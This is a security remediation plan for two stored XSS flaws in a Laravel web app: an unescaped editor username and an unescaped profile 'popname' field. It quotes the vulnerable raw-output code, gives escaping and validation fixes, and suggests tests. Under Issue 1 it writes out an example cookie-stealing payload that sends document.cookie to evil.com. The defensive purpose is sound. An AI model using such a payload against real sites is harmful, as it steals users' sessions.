# Security Fixes Plan

Two stored XSS vulnerabilities identified in the `develop` branch security review.

---

## Issue 1: Stored XSS — `editedByInfo` Username (High Severity)

**Files:**
- `app/View/Components/Post.php` line ~69
- `resources/views/components/post.blade.php` line ~31

**Problem:**
The "Edited by" footer interpolates `$post->editor->username` into a raw HTML string with no escaping, then outputs it with `{!! $editedByInfo !!}`:

```php
$this->editedByInfo = "Edited by <strong>{$post->editor->username}</strong> at ...";
```

Username validation at registration is only `required|string|max:255|unique:users` — no rule blocks `<`, `>`, or other HTML metacharacters. An attacker can register with a username like `<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>`, edit any post, and the payload fires for every user who views it.

**Fix:**
1. In `app/View/Components/Post.php`, wrap the username with `e()`:
   ```php
   $this->editedByInfo = "Edited by <strong>" . e($post->editor->username) . "</strong> at ...";
   ```
2. Add a stricter regex to the username validation rule in `RegisteredUserController` and any profile update request, e.g. `regex:/^[A-Za-z0-9 _\-\.]+$/`.

---

## Issue 2: Stored XSS — `popname` Field (Medium Severity)

**Files:**
- `resources/views/nexus/users/_panel.blade.php` line 11
- `app/Http/Requests/Nexus/UpdateUser.php` (missing validation)

**Problem:**
`_panel.blade.php` renders `popname` with zero encoding:

```php
{!! ($user->popname) ? "<q><em>$user->popname</em></q>" : "<br>" !!}
```

`popname` is in `User::$fillable`, set freely via the profile edit form, and the `UpdateUser` form request has no validation rule for it. Malicious HTML is stored to the database. The partial is currently orphaned (not included by any active route), but the payload persists and would fire if the file is re-introduced or any future view renders `popname` raw.

**Fix:**
1. In `resources/views/nexus/users/_panel.blade.php`, escape the value:
   ```php
   {!! ($user->popname) ? "<q><em>" . e($user->popname) . "</em></q>" : "<br>" !!}
   ```
   Or switch to safe Blade syntax: `{{ $user->popname }}`.
2. Add validation to `UpdateUser.php`:
   ```php
   'popname' => ['nullable', 'string', 'max:100'],
   ```
   Consider also stripping HTML on save via a mutator or `strip_tags()`.
3. Confirm whether `_panel.blade.php` is dead code and delete it if so.
4. Audit all other `{!! !!}` usages that render user-controlled profile fields.

---

## Testing

After fixes, add or update tests to cover:
- Registering/updating a username containing `<script>` and asserting it is stored and rendered escaped.
- Updating `popname` with HTML and asserting the profile page renders it escaped.
